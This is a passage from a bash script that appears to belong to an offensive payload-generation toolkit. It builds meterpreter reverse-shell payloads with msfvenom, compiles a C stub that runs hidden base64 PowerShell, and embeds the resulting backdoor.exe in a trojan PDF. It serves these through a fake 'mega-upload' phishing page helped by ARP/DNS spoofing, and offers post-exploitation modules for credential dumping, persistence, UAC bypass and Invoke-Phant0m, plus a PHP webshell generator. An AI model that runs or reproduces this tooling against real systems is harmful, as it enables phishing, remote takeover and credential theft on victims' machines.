mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ----------------------------------------------------
# EVIL PDF BUILDER
# ----------------------------------------------------
sh_shellcode15 () {

echo "[☠] EVIL PDF BUILDER -> running..."
echo "[☠] targets: windows xp/vista/7!"
sleep 1
# input PDF output format
oUt=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nevil PDF builder\ncrypting mechanisms available:" --radiolist --column "Pick" --column "Option" TRUE "base64" FALSE "random xor key" --width 300 --height 200) > /dev/null 2>&1


if [ "$oUt" = "base64" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF NAME ☠" --text "Enter pdf output name\nexample: shellcode" --width 300) > /dev/null 2>&1
Myd0=$(zenity --title "☠ SELECT PDF FILE TO BE EMBEDDED ☠" --filename=$IPATH --file-selection --text "chose PDF file to use to be serve as template") > /dev/null 2>&1


# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| TROJAN  : $N4m.pdf
| FORMAT  : PSH-CMD -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`

# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $str0
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


echo "[☠] Building template -> template.c!"
sleep 2
# build template file in C language
# reproduction of venom option 6 payload
echo "// C template | Author: r00t-3xp10it " > $IPATH/output/template.c
echo "// execute shellcode powershell base 64 encoded into memory (ram) " >> $IPATH/output/template.c
echo "// ---" >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "#include <stdio.h> " >> $IPATH/output/template.c
echo "#include <stdlib.h> " >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "int main()" >> $IPATH/output/template.c
echo "{" >> $IPATH/output/template.c
echo ' system("powershell -nop -exec bypass -win Hidden -noni -enc InJ3C"); ' >> $IPATH/output/template.c
echo " return 0; " >> $IPATH/output/template.c
echo "}" >> $IPATH/output/template.c

# injecting shellcode into template using SED+bash variable ( $str0 ) = command substitution
sed -i "s|InJ3C|$str0|" $IPATH/output/template.c


# compile template.c into one stand-alone-executable file using mingw32
# template.c (C code to be compiled) -o (save output name)
echo "[☠] Compiling template.c -> backdoor.exe!"
sleep 2
$ComP $IPATH/output/template.c -o $IPATH/output/backdoor.exe -mwindows
strip --strip-debug $IPATH/output/backdoor.exe



# if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file
# using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1


# move files from metasploit to local directory
mv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.pdf|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.pdf|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi




# ---------------------------------------
# chose to build the xor encrypted one :D
# ---------------------------------------
else



# config settings in PDF_encoder.py script
ec=`echo ~`
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF OUTPUT NAME ☠" --text "Enter pdf output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
sleep 2
cd $IPATH/templates/evil_pdf
cp PDF_encoder.py PDF_encoder[bak].py
# config pdf_encoder.py
sed -i "s|Sk3lL3T0n|$IPATH/templates/evil_pdf/skelleton.c|" PDF_encoder.py
sed -i "s|EXE::CUSTOM backdoor.exe|EXE::CUSTOM $ec/backdoor.exe|" PDF_encoder.py
sed -i "s|Lh0St|$lhost|" PDF_encoder.py
sed -i "s|lP0Rt|$lport|" PDF_encoder.py


# runing evil-pdf-builder python script
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
# moving files
mv PDF_encoder[bak].py PDF_encoder.py
mv ~/backdoor.exe $IPATH/output/backdoor.exe
mv ~/backdoor.pdf $IPATH/output/$N4m.pdf
echo "[☠] files generated into output folder..."
cd $IPATH


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.pdf|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.pdf|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

fi




sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/backdoor.exe > /dev/null 2>&1
rm $IPATH/output/$N4m.exe > /dev/null 2>&1
rm $IPATH/output/$N4m.py > /dev/null 2>&1
rm $IPATH/output/template.c > /dev/null 2>&1
rm $ApAcHe/$N4m.pdf > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}






# ------------------------------------------------------
# build shellcode in PHP (webserver stager)
# php/meterpreter raw format OR php/base64 format
# Thanks to my friend 'egypt7' from rapid7 for this one
# interactive kali-apache2 php exploit (by me)
# ------------------------------------------------------
sh_shellcode16 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1


# CHOSE WHAT PAYLOAD TO USE
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nWARNING: this payload only works againt webservers\n\n'Unix Apache2 Exploit' Its my atemp to exploit unix OS\nwith apache2 installed using one php (base64) payload.\ntrigger.sh its deliver to target and when pressed it will\ndownload the php payload to target apache webroot\nand triggers its execution (perfect againts kali distro)\n\nAvailable payloads:" --radiolist --column "Pick" --column "Option" TRUE "php/meterpreter (default)" FALSE "php/meterpreter (base64)" FALSE "Unix Apache2 Exploit (base64)" --width 380 --height 370) > /dev/null 2>&1


if [ "$serv" = "php/meterpreter (default)" ]; then
echo "[☠] Building shellcode -> php format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PHP - WEBSHELL
|_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/$N4m.php"

echo ""
echo "[☠] building raw shellcode..."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
# delete bad chars in php payload
echo "[☠] deleting webshell.php junk..."
sleep 2
cd $IPATH/output



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
       fi


   else


     # edit files nedded
     cd $IPATH/templates/phishing
     cp $InJEc12 mega[bak].html
     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
     # copy from output
     cd $IPATH/output
     echo "[☠] creating archive -> $N4m.zip"
